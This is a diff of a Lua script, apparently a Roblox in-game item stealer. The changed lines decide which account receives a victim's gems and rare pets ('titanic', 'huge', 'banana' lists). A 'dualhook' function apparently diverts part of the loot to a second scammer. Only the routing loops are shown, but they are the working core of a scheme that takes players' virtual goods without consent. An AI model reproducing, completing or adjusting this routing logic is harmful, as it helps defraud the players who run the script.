@@ -1233,6 +1233,8 @@ local user
 -- Gems Only
 if FinalList == 0 then
     if givediaamt >= 1000000000 then
+        user = UserName
+    else
         user = ndUser
     end
     if gemsin ~= nil then
@@ -1254,6 +1256,7 @@ spawn(function()
     while wait() do
         if #TList ~= 0 or TList ~= {} then
             for i, v in pairs(TList) do
+                user = UserName
                 if titanicin ~= nil then
                     if dualhook(titanicin) then
                         user = dhuser
@@ -1281,6 +1284,7 @@ spawn(function()
     while wait() do
         if #BList ~= 0 and #TList == 0 then
             for i, v in pairs(BList) do
+                user = UserName
                 if bananin ~= nil then
                     if dualhook(bananin) then
                         user = dhuser
@@ -1310,6 +1314,7 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
+                user = ndUser
                 if hugein ~= nil then
                     if dualhook(hugein) then
                         user = dhuser
@@ -1338,6 +1343,7 @@ spawn(function()
     while wait() do
         if #PList ~= 0 and #TList == 0 and #BList == 0 and #HList == 0 then
             for i, v in pairs(PList) do
+                user = ndUser
                 if pogin ~= nil then
                     if dualhook(pogin) then
                         user = dhuser
@@ -1365,7 +1371,7 @@ spawn(function()
     while wait() do
         if #EList ~= 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EList) do
-                user = UserName
+                user = ndUser
                 if excin ~= nil then
                     if dualhook(excin) then
                         user = dhuser
